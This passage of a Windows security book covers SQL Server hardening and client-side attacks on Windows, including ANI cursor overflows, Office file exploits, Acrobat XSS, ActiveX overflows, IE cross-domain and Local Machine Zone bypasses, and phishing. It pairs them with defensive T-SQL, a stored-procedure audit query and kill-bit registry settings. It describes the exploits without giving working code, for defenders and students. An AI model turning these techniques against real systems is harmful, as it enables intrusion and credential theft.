extended stored procedures as a system  administrator from immediately becoming local operating system administrators or the  system account  LocalSystem .  Local accounts will work just fine in most installations instead of the LocalSystem or  domain accounts referenced in Books Online. Using local accounts can help contain a  penetration as the attacker will not be able to use her newly acquired security context to  access other hosts in the domain. Domain accounts are required only for remote procedure    312   Hacking Exposed Windows: Windows Security Secrets & Solutions   calls,  integrated  heterogeneous  queries,  off-system  backups,  or  certain  replication  scenarios.  To  use  a  local  account  after  installation,  use  the  Security  tab  under  Server  Properties  in  Management  Studio.  Simply  enter  the  local  server  name  in  place  of  a  domain,  followed  by  a  local  user  you  have  created   for  example:  servername\sql- account  in the This Account prompt. If you make the change using Enterprise Manager  or  Configuration  Manager,  SQL  Server  will  take  care  of  the  necessary  permissions  changes such as access to Registry keys and database files.  Perform Thorough Input Validation  Never trust that the information being sent back from the  client is acceptable. Client-side validation can be bypassed so your JavaScript code will not  protect you. The only way to be sure that data posted from a client is not going to cause  problems with your application is to validate it properly. Validation doesn’t need to be  complicated. If a data field should contain a number, for example, you can verify that the  user entered a number and that it is in an acceptable range. If the data field is alphanumeric,  make sure that the length and content of the input is acceptable. Regular expressions are  a great tool for checking input for invalid characters, even when the formats are complex,  such as in e-mail addresses, passwords, and IP addresses.  Prepare a Lockdown Script to be Applied to New Installations  A lockdown script is a great way  to baseline all SQL Server installations so that exposure to exploitation is minimized.  Leaving new installations in an unsecured state until an administrator has the time to  address it is not acceptable. A lockdown script helps to enforce a “secure by default”  deployment  that  is  critical  for  both  server  and  workstation  SQL  Server  installations.  Most of the recommended lockdown settings are now the default in SQL Server 2005, so  much of this may not be necessary if you are already running this platform.  If you need a head start on creating a lockdown script for your organization, check  the “References and Further Reading” section at the end of this chapter for a link. Some  things  that  all  lockdown  scripts  should  do  include  securing  the  sa  account,  enabling  logging, setting the SQL Server security mode to Windows Only, and restricting access to  powerful system and extended stored procedures.  When customizing your lockdown scripts, remember to remove  or restrict access to   powerful stored procedures such as xp_cmdshell. To drop an extended stored procedure,  enter the following T-SQL commands: use master sp_dropextendedproc 'xp_cmdshell'  If you’d prefer simply to ensure that members of the public role cannot access an   extended stored procedure, use the following code as an example: REVOKE execute on xp_instance_regread to public GO  In most cases, there is no reason why users or anybody else should be using your  SQL server to execute commands against the underlying operating system. Table 9-4 lists  other extended stored procedures that should be considered for deletion or restricted to  system administrators. Remember that skillful attackers can add dropped XPs back if the    Chapter 9:  Hacking SQL Server   313  server  is  sufficiently  compromised,  but  at  least  you’ve  made  them  go  through  the  motions—and those who don’t have the resources to do it will be stopped cold. Also, be  forewarned that excessive removal of extended stored procedures can cause installation  problems with service packs and hotfixes. If you drop any extended stored procedures,  be sure to restore them before applying service packs or hotfixes.  Incorporate Integrity Checking and Change Control  It is vital to ensure that your SQL Server  code remains safe from tampering by attackers  who may be trying to establish covert  channels by placing Trojans in SQL code  or even overly-zealous developers. In times of  crisis, it is very possible that someone may implement unsafe routines in an effort to  make  things  operational.  If  left  unchecked,  this  type  entropy  can  leave  an  otherwise  well-secured installation in tatters. When SQL Server stored procedures, tables, triggers,  views, and any other database objects are deployed, take special care to check the code  against the original regularly to ensure that no unauthorized changes have occurred.  Use SQL Profiler to Identify Weak Spots  One excellent technique for finding SQL injection  holes  is  to  inject  an  exploit  string  into  fields  in  your  application  while  running  SQL  Profiler and monitor what the server is seeing. To make this task easier, it helps to use a  filter on the TextData field in SQL Profiler that matches your exploit string. An example  of an exploit string is something as simple as a single quote surrounded by two rare  characters, such as the letter z, as shown in Figure 9-10.

Use Alerts to Monitor Potential Malicious Activity  By implementing alerts on key SQL Server  events  such as failed logins , it is possible to alert administrators that something may be  awry. An example is to create an alert on event IDs 18450, 18451, 18452, and 18456  failed  login attempt , which contain the text ‘sa’  include the quotes so the alert doesn’t fire  every time the user Lisa logs in . This would allow an administrator to be alerted each  time a failed attempt by someone to access the SQL server as sa occurs and could be an  indication that a brute-force attack is taking place.  Discourage  Use  of  EXEC  or  sp_executesql  T-SQL  Statements  The  use  of  either  of  these  statements in SQL Server represents the equivalent of string building in the database.  With the proper use of QUOTENAME and REPLACE functions in your T-SQL code, you can  perform input validation on the code, but the safer route is to avoid using these statements  altogether. String building in the database just increases your surface area for attack, so  avoid it if at all possible.   Chapter 9:  Hacking SQL Server   315  SUMMARY  The following is a sample piece of T-SQL code to help you search for stored procedures   that may contain these dangerous statements: select o.name, o.type from syscomments c inner join sysobjects o on o.id=c.id where o.type='P' AND  [text] like '%sp_executesql%' OR [text] like '%EXEC %' OR [text] like '%EXECUTE %'   Consider Hiring or Training QA Personnel for Testing  For those constantly developing new  software in companies for which outside security audits can be prohibitively expensive,  it is recommended that current or new quality assurance personnel be used to perform  audits. Since these folks will already be testing and probing your applications for bugs  and functionality, it is generally an efficient option to have them test for SQL injection  attacks and other programmatic security issues before your software ships. You are much  better off spending the time up front to test the software before it ends up on the Bugtraq  or another security mailing list and you start scurrying to get the service packs out. Ever  heard the saying, “An ounce of prevention is worth a pound of cure”? It’s true.  In  this  chapter,  we’ve  covered  a  large  amount  of  security-related  information  about  Microsoft  SQL  Server.  We  began  with  a  case  study  illustrating  the  most  common  mechanism  of  SQL  compromise  and  continued  with  an  examination  of  how  the  SQL  Server security model works. We also mentioned some of the new features Microsoft has  included in SQL Server 2005 to help secure your installations.  We examined some techniques that attackers might use to gain information about  your  SQL  databases  before  staging  an  open  attack.  By  identifying  the  possible  infor- mation leaks in your organization, you might be able to plug them before an attacker  discovers  them.  We  also  looked  at  some  of  the  tools  of  the  trade  in  the  SQL  Server  exploitation game, and we discussed why leaving a SQL server in mixed security mode  open to the world is a bad idea.  Next, we explored the world of SQL injection and how applications can expose your  SQL server to attack. This was followed by a deep analysis of injection techniques, tools,  and consequences. We discussed countermeasures to deal with the threat and coding  suggestions that will help going forward.  Finally, we discussed what your organization can do to protect your SQL servers and  applications from internal and external attacks. Take the time to compare your current  infrastructure to the checklist and see whether you can improve security. Keep in mind  that relying on any one layer of security is folly. These practices are best when combined,  so that when one layer fails  not if     , another layer of security can back it up.  We hope that by now you are fully aware of the seriousness of SQL Server security  issues and the effect that a lack of security can have on your valuable data. Take the time  to catalog all the SQL servers in your organization and compare their configuration to  the best practices. In addition, you need to pay special attention to applications that use  SQL  Server  to  ensure  that  application  vulnerabilities  don’t  punch  right  through  your  defenses.  If  you  always  put  yourself  into  the  role  of  the  attacker  and  are  constantly  monitoring  your  servers  for  configuration  changes  and  potential  security  holes,  you  have a chance.   316   Hacking Exposed Windows: Windows Security Secrets & Solutions   REFERENCES AND FURTHER READING  Reference  Location  Freeware Tools Paros Absinthe BobCat Sqlninja SQL Power Injector Achilles OWASP WebScarab Project Sqlpoke, sqlbf, sqldict, and  assorted dictionaries SQLPing  Other SQL Server  Vulnerabilities SQL Slammer worm  General References Code generation tools Improving Data Security by  Using SQL Server 2005 SQL Server 2000 Best Practices  Analyzer WebGoat Application Security  Trainer Writing Secure Code, 2nd Edition “New SQL Truncation Attacks  and How to Avoid Them,” by  Bala Neerumalla Advanced SQL Injection in SQL  Server Applications “Threat Proﬁ ling Microsoft SQL  Server” by David Litchﬁ eld SQL Security reference website SQL Security Lockdown Script  for SQL 2000  www.parosproxy.org www.0x90.org www.northern-monkee.co.uk projects bobcat bobcat.html http:  sqlninja.sourceforge.net  www.sqlpowerinjector.com www.mavensecurity.com achilles www.owasp.org index.php Category:OWASP_WebScarab_Project http:  packetstormsecurity.org  www.sqlsecurity.com Tools FreeTools tabid 65 Default.aspx  www.cert.org advisories CA-2003-04.html  www.codegeneration.net www.microsoft.com technet itshowcase content sqldatsec.mspx  www.microsoft.com downloads details.aspx?FamilyID= B352EB1F-D3CA-44EE-893E-9E07339C1F22&displaylang=en www.owasp.org index.php Category:OWASP_WebGoat_Project  by Michael Howard and David C.

Historically,  relatively short shrift has been given to the client end of Windows security, mostly  because attackers focused on plentiful server-side vulnerabilities. As server-side security  has improved, attackers have migrated to the next obvious patch of attack surface.  A  simple  glance  at  recent  headlines  will  illustrate  what  a  colossal  calamity  client  security has become. Terms like phishing, spyware, and adware, formerly uttered only by  the technorati, now make regular appearances in the mainstream media. The parade of  vulnerabilities  in  the  world’s  most  popular  client  software  seems  never  to  abate.  Organized criminal elements are increasingly exploiting client technologies to commit  fraud  against  online  consumers  and  businesses  en  masse.  Many  authorities  have  belatedly  come  to  the  collective  realization  that  at  least  as  many  serious  security  vulnerabilities exist on the “other” end of the security telescope, and numerous other  factors make them just as likely to be exploited, if not more likely.  In fact, legitimate inbound Internet traffic is probably one of the most effective vectors  for malicious code available today. Corporate firewalls aggressively vet inbound traffic to  servers but happily forward traffic to web-browsing, e-mail-reading internal users, usually  with little filtering. And what modern company could operate for very long in today’s  economy without the Web and e-mail? Thus, the very worst that the Internet has to offer is  quite easily aimed directly at those who are the least aware of the danger—the end user.  Microsoft client applications are ubiquitous and often packaged in both off-the-shelf  systems as well as standard issue office computers. Desktop computers are often less  securely  managed  than  servers  that  have  system  administrators  watching  over  them  closely.  Not  only  are  the  doors  wide  open  to  this  target-rich  environment,  but  Internet  technologies of various flavors have developed to enable relatively simple execution of  remote commands on the client system, whether it be embedded in a web page or an e- mail message. Once this active content “detonates” on the internal network, it can yield  the equivalent of direct external control.  We discuss these factors and related vulnerabilities in this chapter. Our discussion is   organized around the following basic types of client attacks:    Exploits  Malicious executable code is run on a client and its host system via an   overt vulnerability  including software bugs and or misconﬁ guration . Absent such  vulnerabilities, this approach is obviously much harder for attackers, and they  typically turn to the tried-and-true fallback, social engineering  see next bullet .    Trickery  The use of trickery can cause the human operator of the client   software to send valuable information to the attacker, regardless of any overt  vulnerabilities in the client platform. The attacker in essence “pokes” the client  with some attractive message, and then the client  and or its human operator   sends sensitive information directly to the attacker or installs some software  that the attacker then uses to pull data from the client system.  As always, we discuss countermeasures at critical junctures, as well as at the end of   the chapter in summarized form.   Chapter 10:  Hacking Microsoft Client Apps   319  EXPLOITS  The fundamental premise of this class of attacks is to get the web client to execute code  that does the bidding of the attacker. In this section, we discuss attacks against a diverse  set of Windows client applications, illustrating the rich client application attack surface  available on modern Windows systems.  Animated Cursor  ANI  Vulnerability  Popularity: Simplicity: Impact:  Risk Rating:  7 5 9 7  Alexander Sotirov discovered this vulnerability that affects all unpatched versions of  Windows up through Vista. Animated cursors are a feature that allows a series of frames  to  appear  at  the  mouse  pointer  location  instead  of  a  single  image,  resulting  in  the  appearance  of  dynamic  behavior,  or  animation. Animated  cursors  file  types  have  the  suffix  .ani,  .cur,  or  .ico,  although  the  suffix  doesn’t  really  matter,  because  Windows  recognizes an animated cursor file if it begins with the ASCII sequence RIFF  hex 52 49  46 46 . The vulnerability is a straightforward buffer overflow exploited via oversized file  headers,  and  an  attack  could  easily  be  implemented  by  getting  a  victim  to  view  a  malicious cursor or icon file via a malicious website or rich e-mail message. In fact, news  reports circa April 2007 indicated that a “toxic” spam campaign bearing pictures of pop  star  Britney  Spears  were  used  by  hackers  to  trick  surfers  into  visiting  websites  that  exploited the animated cursor vulnerability.  Alexander posted a video documenting an exploit of Vista running IE 7 using the  Metasploit  Framework  that  shoveled  a  command  shell  back  to  the  attacker   see  “References and Further Reading” for a link . Due to Vista IE 7’s Protected Mode IE, the  command  shell  retained  only  the  privileges  of  the  compromised  process  and  did  not  have write access to anything on the system  other than the IE temporary directories and  Registry settings . Another exploit was posted by milw0rm and Skylined that used a  heap corruption technique in conjunction with an icon file  named riff.htm, by the way   to launch calculator.exe on Vista RTM versions.  Animated Cursor Countermeasures Obviously, obtaining and installing the patch is the absolute defense against such attacks.  Microsoft Security Bulletin MS07-017 contains the relevant patch details. Running Vista  with Protected Mode IE 7  the default  also mitigates the impact of successful exploitation   although an attacker would still have read access to all your data . Numerous other  workarounds  are  discussed  in  the  “General  Countermeasures”  section  later  in  this  chapter, since they are applicable to most other client vulnerabilities discussed in this  chapter.   320   Hacking Exposed Windows: Windows Security Secrets & Solutions   Ofﬁ ce Document Exploits  Popularity: Simplicity: Impact:  Risk Rating:  7 5 9 7  With  the  near-ubiquity  of  Microsoft  Office  files   Word,  PowerPoint,  Excel   being  trafficked globally via e-mail and the Web, it’s small wonder that the attack community  began  taking  a  great  interest  in  identifying  vulnerabilities  in  these  file  formats.  This  approach was always popular, but in 2006 and 2007 a slew of such vulnerabilities began  to be reported publicly, as recorded in Microsoft bulletins MS06-003, -010, -012, -027,  -028, -037, -038, -039, -048, -058, -059, -060, and -062; and MS07-001, -002, -003, -014, -015,  -023,  -024,  and  -025.  This  compares  to  fewer  than  five  Office-related  vulnerabilities  announced in 2005  by our rough count .  Obviously, numerous specific vulnerabilities could be discussed here, but we’ll focus  on one to illustrate the larger problem. In late 2006, Arnaud Dovi discovered a pointer  null dereference vulnerability in the way slide notes fields were parsed within PowerPoint  presentations.  If  the  attacker  can  get  the  victim  to  open  a  malicious  PowerPoint  file,  arbitrary  code  execution  results.  A  similar  null  dereference  vulnerability  had  exploit  code  published,  and  deeper  details  were  presented  on  Microsoft’s  Security  Response  Center  MSRC  blog  see “References and Further Reading” . This exploit code generated  a malicious PowerPoint file called Nanika.ppt, which caused PowerPoint to crash when  opened.  Ofﬁ ce Document Countermeasures Clearly, keeping up with patches for all application software—not just for the operating  system—is strongly recommended  particularly broadly deployed software like Microsoft  Office that is likely to be targeted by attackers . Many vendors are offering automated  update  services  for  their  applications,  and  we  recommend  setting  these  to  update  automatically to take the burden off users and make it more likely that patches will be  applied in a timely way.  Another key recommendation is to be extraordinarily cautious with files received  from untrusted sources, whether via e-mail attachments or hyperlinks forwarded from  unknown sources. We know this is easier said than done, but it’s well worth the effort. A  good option to consider is Microsoft Office Isolated Conversion Environment  MOICE ,  which converts Word, Excel, and PowerPoint binary file formats to the lower-risk Office  Open  XML  format  as  they  are  opened.  MOICE  has  some  limitations   for  example,  it  works only with Office 2003 and 2007 .  See “References and Further Reading” for a link  to more details.   Also, logging in using the least privileged account can also help mitigate the effects  of successful exploitation. This is sometimes a small consolation, as an attacker can often  still access sensitive data related to the logged-in account, but at least it prevents system-   Chapter 10:  Hacking Microsoft Client Apps   321  wide compromises that are much harder to detect and eradicate. As we’ve discussed  throughout this book, Windows Vista and later make running with least privilege much  easier through features such as User Account Control and Protected Mode IE.  We discuss more countermeasures to these attacks in the upcoming section “General  Countermeasures,” since they are generally applicable to these and other types of attacks  we discuss in this chapter.  Cross Site Scripting through Adobe Acrobat  Popularity: Simplicity: Impact: Risk Rating:  4 7 6 6  We’ll pick on another big software vendor this time to show that Microsoft isn’t the  only vendor targeted by malicious document attacks. One of the most well-known attack  vector  for  exploiting  client-side  vulnerabilities  is  Cross  Site  Scripting   XSS    see  “References and Further Reading” . XSS is basically the exploitation of an input injection  vulnerability on a server that executes arbitrary commands on the client. Using a security  vulnerability in Adobe Acrobat Readers, Stefano Di Paola and Giorgio Fedon identified  a flaw that would allow an attacker to execute XSS attacks through any websites that  host PDF files. Here’s an example link: http:  host.com path to pdf?whatever=malicious javascript  The attack is delivered through one of the classic client attack mechanisms, such as a  malicious web page or rich e-mail message. A victim that clicks the link will have the  JavaScript code execute in the user’s browser. At first glance, this may appear the same  as any other XSS or phishing attack. However, the significance lies in the fact that the  vulnerability allows the attacker to choose any web server that hosts PDF files as a target.  Given that browser-based security models restrict access of JavaScript to domains, this  vulnerability allows an attacker to inject Javascript and have it executed on many public  and private websites, as long as they host PDF files. Proof-of-concept exploits have been  developed that allow attackers to hijack sessions from popular online banking and web- based e-mail sites  see “References and Further Reading” for links .  See Hacking Exposed: Web Applications, 2nd Edition, for more background on Cross Site  Scripting attacks.  Adobe Acrobat XSS Countermeasures As with many vulnerabilities, the first line of defense is to make sure your applications  are patched to the latest security patches; in this case, Adobe Acrobat 7.0.8 or greater  fixes  this  issue,  according  to Adobe  Security  Bulletin APSA07-01. Adobe’s  automatic  update feature makes this convenient for most users.   322   Hacking Exposed Windows: Windows Security Secrets & Solutions   However, many operators of websites cannot depend on all their users to upgrade  their Acrobat readers in a timely manner. Removing all PDF files from a website is usually  not a viable option. A temporary solution is to force the user to download the PDF or  stream the PDF as an octet stream.  A similar perennial security issue for Microsoft clients is the file:  servername resource URL embedded  in a malicious web page or HTML e-mail message, which will invoke a Server Message Block  SMB   session with a servername, potentially providing LM NTLM credentials to eavesdroppers and opening  the client system to rogue SMB server and man-in-the-middle attacks. Such attacks are covered in  Chapter 5.  ActiveX Abuse  Popularity: Simplicity: Impact:  Risk Rating:  4 3 10 6  ActiveX has been the center of security debates since its inception in the mid-1990s,  when  Fred  McLain  published  an  ActiveX  control  that  shut  down  the  user’s  system  remotely. ActiveX is easily embedded in HTML using the   tag, and controls  can  be  loaded  from  remote  sites  or  the  local  system.  These  controls  can  essentially  perform any task with the privilege of the caller, making them extraordinarily powerful,  and also a traditional target for attackers. Microsoft’s Authenticode system, based on  digital  signing  of  “trusted”  controls,  is  the  primary  security  countermeasure  against  malicious controls.  See “References and Further Reading” for more information about  ActiveX and Authenticode.   Traditionally,  attackers  have  focused  on  controls  that  are  preinstalled  on  victims’  Windows machines, since they are already authenticated, and require no prompting of  the  user  to  instantiate.  In  mid-1999,  Georgi  Guninski,  Richard  M.  Smith,  and  others  reported that the ActiveX controls marked with the “safe for scripting” flag could be  instantiated by attackers without invoking Authenticode. This only increased the attack  surface of ActiveX controls that could be used for abusive purposes. From an attacker’s  perspective, all he needs to do is find a preinstalled ActiveX control that performs some  privileged  function,  such  as  read  memory  or  write  files  to  disk,  and  he’s  halfway  to  exploit nirvana.  Table 10-1 lists some of the more sensationally abused ActiveX controls from recent  memory.  This is just a sampling: try searching for “internet explorer” on cve.mitre.org  cve, and see how many ActiveX-related bugs pop up!   To provide a more recent example of the impact that an ActiveX vulnerability can  have,  let’s  examine  the  Microsoft  Speech  API  ActiveX  control  buffer  overflow  issue  discovered by Will Dormann. The ActiveX controls used for ActiveVoice and ActiveListen    Chapter 10:  Hacking Microsoft Client Apps   323  ActiveX Control DHTML Editing  Microsoft DDS  Library Shape  Control JView Proﬁ ler  ADODB.Stream  Shell.Application  Shell.Explorer  HTML Help  WebBrowser  XMLHTTP  Past Vulnerability LoadURL method can  violate same origin policy Heap memory corruption Arbitrary code execution as   Impact Read and write data  caller  Heap memory corruption Arbitrary code execution as   None—used to write data  after exploiting LMZ Use CLSID to disguise  malicious ﬁ le being  loaded Rich folder view drag-n- drop timing attack Stack-based buffer  overﬂ ow from overlong  “Contents ﬁ le” ﬁ eld in  .hhp ﬁ le Potentially all exploits  that affect IE Old: LMZ access New: none, used to  read download ﬁ les  from to LMZ  caller Files with arbitrary content  placed in known locations  same as ADODB.Stream    same as ADODB.Stream   Arbitrary code execution as  caller  Arbitrary code execution as  caller Read write arbitrary  content from to known  locations  Table 10-1  Selected ActiveX Security Vulnerabilities   XVoice.dll and Xlisten.dll, respectively  contain buffer overflows that can allow a remote,  unauthenticated  attacker  to  execute  arbitrary  code  on  a  victim  by  tricking  her  into  opening an HTML document that instantiates the vulnerable controls. The cause of the  vulnerability  is  a  buffer  overflow  in  the  ModeID  field. A.  Micalizzi  wrote  a  proof-of- concept exploit that performs this trick on WinXP SP2 and Win2K SP4. The exploit is  platform-specific due to the arbitrary condition of the CPU execution stack in different  environments and creates a user su with password tzu on the target system. Of course,  this shell code could be replaced with something more malicious.   324   Hacking Exposed Windows: Windows Security Secrets & Solutions   ActiveX Countermeasures In general, users should restrict or disable ActiveX in the appropriate IE zone  see the  section entitled “IE Security Zones” later in this chapter .  From  a  developer’s  perspective,  don’t  write  safe-for-scripting  controls  that  could  perform privileged actions on a user’s system. We also encourage developers to check  out the SiteLock tool, which has no warranties or support from Microsoft but can be  found  at  http:  msdn.microsoft.com archive en-us samples internet components  sitelock default.asp.  When  added  to  your  build  environment,  the  SiteLock  header  enables an ActiveX developer to restrict access so that the control is deemed safe only in  a predetermined list of domains.  Most recently, Microsoft has begun “killing” potentially dangerous ActiveX controls  by setting the so-called kill bit for a given control. Software developers who simply want  to deactivate their ActiveX controls rather than patch them can take this route. Individual  users can also manually set kill bits for individual controls using the kill-bitting techniques  described in “References and Further Reading.”  Microsoft’s Security Bulletin MS07-033 discusses the fix for the Speech API ActiveX  control buffer overflow, which is to kill bit them both. Sample Registry settings showing  each control kill bitted are shown here: [HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Internet Explorer\ActiveX Compatibility\ {4E3D9D1F-0C63-11D1-8BFB-0060081841DE}] "Compatibility Flags"=dword:00000400 [HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Internet Explorer\ActiveX Compatibility\ {EEE78591-FE22-11D0-8BEF-0060081841DE}] "Compatibility Flags"=dword:00000400  As  always  with  Microsoft  products,  upgrading  to  the  most  recent  version  brings  optimized security enhancements. In IE 7, Microsoft introduced the so-called “ActiveX  opt-in” feature, that by default disables nearly all preinstalled ActiveX controls, and then  allows users to easily enable or disable ActiveX controls as needed by prompting them  via the Information bar. Some aspects of this have been implemented in prior versions of  IE as well, but in our experience it’s much smoother and better integrated on IE 7 in Vista  with User Account Control  UAC ; to see this for yourself, try installing Adobe’s Flash  control in your browser on Windows XP IE 6 versus Vista IE 7—we think you’ll see the  difference, too.  A set of newly developed ActiveX best practices underlie the ActiveX opt-in feature  as well, so the behavior is much more intuitive than prior versions. This is a welcome  change from the bad old days of ActiveX, which effectively forced the user to make a  “thumbs up thumbs down” decision on whether to run a control or not  also known as  Authenticode .  Microsoft  seems  to  be  learning  to  walk  a  more  nuanced  line  between  locking  down  the  browser  to  a  near-unusable  state   for  example,  Enhanced  Security  Configuration , and on the other extreme simply dumping security decisions on users  via cryptic user interfaces.   Chapter 10:  Hacking Microsoft Client Apps   325  IE Vulnerabilities  Popularity: Simplicity: Impact:  Risk Rating:  4 3 10 6  Now  let’s  discuss  one  of  the  primary  hosts  of ActiveX  controls  within  Windows,  Internet Explorer  IE , which has had a number of security problems in its own right. In  fact, IE may have accrued the most security vulnerabilities of any product that Microsoft  has produced. Even as server-side products such as Internet Information Services  IIS   and Windows Server have enjoyed a lower frequency of security bulletins, IE just keeps  on chugging. Let’s illustrate with some examples.  Cross-domain Access Attacks  One of the most troubling trends in IE vulnerabilities is so- called cross-domain access issues. Most modern browsers use a security model based on  domains, which are arbitrary security boundaries designed to prevent windows frames  documents scripts  from  one  source   usually  specified  by  a  Domain  Name  System  domain   from  interacting  with  resources  originating  from  another  location.  This  is  sometimes  also  referred  to  as  the  “same-origin  policy,”  per  the  original  Netscape  JavaScript reference manuals. For example, if evilsite.com could execute JavaScript in the  Citibank.com  domain,  Citi’s  customers  could  be  victimized  by   say   a  simple  e-mail  containing malicious script that hijacked their cookies, logged onto Citi’s online banking  website, and wired cash to the location of the attacker’s choice.  The  history  of  IE  cross-domain  exploits  is  long  and  varied.  In  mid-2007,  browser  security guru Michal Zalewski demonstrated a vulnerability in IE 6 and 7 for which he  claimed “the entire security model of the browser collapses like a house of cards and  renders you vulnerable to a plethora of nasty attacks.” The essence of the problem is a  race  condition  when  navigating  from  one  site   which  can  be  accessed  via  script  and  modified by the attacker  to another, such that a window of time exists in which the  script can perform actions with the permissions for the old page against content from the  newly loaded page  for example, read or set the prior page cookie . This is a fairly nasty  violation of the same domain model, and Zalewski posted a proof-of-concept page that  “steals” your cookie from Google’s Polish language site, as show in Figure 10-1. In  2006,  Matan  Gillon  illustrated  how  to  inject  Cascading  Style  Sheets   CSS   into  remote  web  pages  containing  curly  brackets   {} ,  which  are  normally  used  to  define  style selectors, properties, and values. By exploiting a flaw in the IE parser for CSS, and  an operational oversight by Google, Gillon crafted a proof-of-concept exploit that covertly  grabbed user data when users used Google’s Desktop Search utility.  In  early  2005,  Michael  Evanchik,  Paul  from  GreyHats  Security,  and  http-equiv  reported that the HTML Help ActiveX Control  hhctrl.ocx  did not properly determine  the source of windows opened by the Related Topics command, permitting an attacker    326   Hacking Exposed Windows: Windows Security Secrets & Solutions   Figure 10-1  Michal Zalewski’s IE 6 7 “entrapment 1” exploit steals a cookie.  to open two different windows pointed to the same domain, thus connecting the parent  windows across the domain security boundary. Incidentally, this hhtctrl.ocx issue was  reported  after  Microsoft  implemented  its  Local  Machine  Zone   LMZ   lockdown  in  Windows XP Service Pack 2  XP SP2 , but more on this later.  In mid-2004, Paul from GreyHats Security reported a cache confusion vulnerability  with IE, where it would essentially forget the source of a cached reference to a function  when  the  parent  domain  was  changed,  allowing  an  attacker  to  control  the  context  in  which the cached function was executed. This would allow execution of script in arbitrary  domains of the attacker’s choice, simply by getting the victim to view some malicious  HTML. The list goes on.  Local  Machine  Zone  Attacks  A  popular  sub-theme  of  cross-domain  access  issues  is  attacking  the  IE  Local  Machine  Zone   LMZ,  also  known  as  the  My  Computer  zone ,  which  is  designed  to  differentiate  between  potentially  malicious  remote  scripts  and  “friendly” executables loaded from the local machine. The LMZ is a “special” zone in  IE’s implementation of the domain security model, in which code runs with the privilege  of the user running IE. Thus attackers have traditionally sought to inject malicious code  into the LMZ. LMZ injection exploits proliferated to such an extent that Microsoft finally  released a feature called Local Machine Lockdown in XP SP2. Many have thus argued for  years that the whole concept of remote access to “friendly” local scripts is unrealistic and  the LMZ design should be scrapped altogether.  Case in point: it didn’t take long for notorious web client hacker http-equiv to bypass  LMZ  Lockdown,  illustrating  the  ongoing  challenges  of  defending  against  design  liabilities. Thor Larholm offered a solid description of the underpinnings of this exploit.  Essentially, the exploit uses the HTML image element  IMG  with the DYNSRC attribute  pointed to a remote file. When this image is dragged-and-dropped onto a window that  references local content, the file referenced in the DYNSRC attribute can be planted on the  victim’s machine in a known location. Http-equiv posted a demonstration exploit called  ceegar.html that uses the AnchorClick behavior to open C:\WINDOWS\PCHealth\ in  a named window, which is then used as a drag-and-drop point for the file referenced by  the DYNSRC attribute.   Chapter 10:  Hacking Microsoft Client Apps   327  Rafel Ivgi posted another example of an LMZ access mechanism in mid-2004. Dutch  security researcher Jelmer Kuperus  known by his online handle, jelmer  coded a proof- of-concept exploit that uses the IE showModalDialog method within a malicious web  page  or HTML e-mail  that creates a modal dialog window in the upper-left corner of  the user’s screen  a modal dialog box retains the input focus while open; the user cannot  switch windows until the dialog box is closed . The modal dialog references the location  of another object, an IFRAME. Through a sort of timing trick, Jelmer changes the location  of  the  IFRAME  while  the  modal  dialog  is  open,  and  when  it  closes,  because  of  the  vulnerability, the location referenced by the IFRAME is under Jelmer’s control, and it is  set to the LMZ. The following illustration shows Jelmer’s proof-of-concept modal dialog  box—you can see from the status bar for this window that it is executing in the Local  Computer security zone.  From here, Jelmer loads some JavaScript in more IFRAMEs located in the LMZ. These  scripts do the heavy lifting, using the ADODB.stream ActiveX control installed with IE  to copy an executable from his site down to the local machine and run it  he overwrites  the  Windows  Media  Player  executable  at  C:\Program  Files\Windows  Media  Player\ wmplayer.exe to disguise its true purpose . Jelmer’s executable is a harmless graphics  clip, but the point is made—code can now be executed with the full privileges of the  logged-on user.  IE Vulnerability Countermeasures These exploits represent only a small fraction of the published IE vulnerabilities of the  last several years, unfortunately. What’s a security-conscious Windows user to do? At the risk of sounding like a broken record, we’ll enumerate the biggies again:     Keep up with patches  running the latest Windows and IE versions is optimal,   Vista and IE 7 as of this writing .     Run with least privilege  Vista UAC and IE 7 Protected Mode are state of the art   in this regard .  In addition to these precautions, we also recommend conservative configuration of  IE’s Security Zones feature, which we will discuss in greater detail upcoming in “General  Countermeasures.”  TRICKERY  If an attacker is unable to identify a technical vulnerability to exploit, he may fall back on  trickery.  The  term  social  engineering  has  also  been  used  for  years  in  security  circles  to  describe this technique of using persuasion and or deception to gain access to digital  information.   328   Hacking Exposed Windows: Windows Security Secrets & Solutions   Such attacks have garnered an edgy technical thrust in recent years, and new ter- minology has sprung up to describe this fusion of basic human trickery and sophisticated  technical  sleight-of-hand.  The  expression  that’s  gained  the  most  popularity  of  late  is  phishing,  which  is  essentially  classic  social  engineering  attacks  implemented  using  Internet technology. This is not to minimize its impact, however, which by some estimates  costs consumers more than $1 billion annually, a figure that is growing steadily.  More  aggressive  fraudsters  trick  users  into  installing  deceptive  software  called  spyware, a broad class of programs that includes covert or deceptive software that hijack  computing resources to display ads or monitor web surfing habits  usually for later sale  to marketing companies .  Since this book focuses on Windows, we’re not going to explore phishing and spyware  in  general,  since  they  affect  not  just  Microsoft  products,  but  any  client  application,  including  Mozilla  Firefox,  Apple  Safari,  and  the  whole  menagerie  of  programs  that  inhabit the typical end-user system. Rather, we will focus briefly here on the following  two topics:     How IE vulnerabilities can be leveraged in phishing attacks, and what to do   about it     Common insertion points for spyware and how to spot it  We  recommend  Hacking  Exposed:  Web  Applications,  2nd  Edition  if  you’re  interested  in  deeper  treatment of phishing, spyware, and related online scams.  Phishing Popularity: Simplicity: Impact:  Risk Rating:  10 8 8 9  Phishing  is  the  use  of  Internet  technologies  to  defraud  victims.  The  most  typical  phishing scam is a mass–e-mailed message that attempts to convince victims to reset  their online banking account password at a site controlled by the fraudster, who then  harvests credentials from anyone gullible enough to react to the message.  In our experience, phishing e-mails typically have the following characteristics:     Targeted at ﬁ nancially consequential online users—that’s where the money is!    Invalid or laundered source addresses—these scams don’t require a valid reply- to address, so most don’t even bother making one up  some even use legitimate  addresses .     Spoof authenticity using familiar brand imagery—this is the hook that fools   most users.     Compels action with urgency—most phishing sites get taken down within days,   so they urge potential victims to act fast.   Chapter 10:  Hacking Microsoft Client Apps   329  As  documented  by  groups  such  as  the  Anti-Phishing  Working  Group   APWG ,  phishing is a major criminal industry. And this is just using basic trickery—when phishers  can combine their con artistry with a Windows vulnerability, things get much worse.  Let’s take a look at a few examples.  Michal  Zalewski  strikes  again  with  his  mid-2007  demonstration  of  another  vulnerability  related  to  the  previously  discussed  IE  entrapment  bug  that  allows  a  malicious page to spoof address bar, page information dialogs, and SSL certificates. This  is achieved through manipulation of location Document Object Model  DOM  objects to  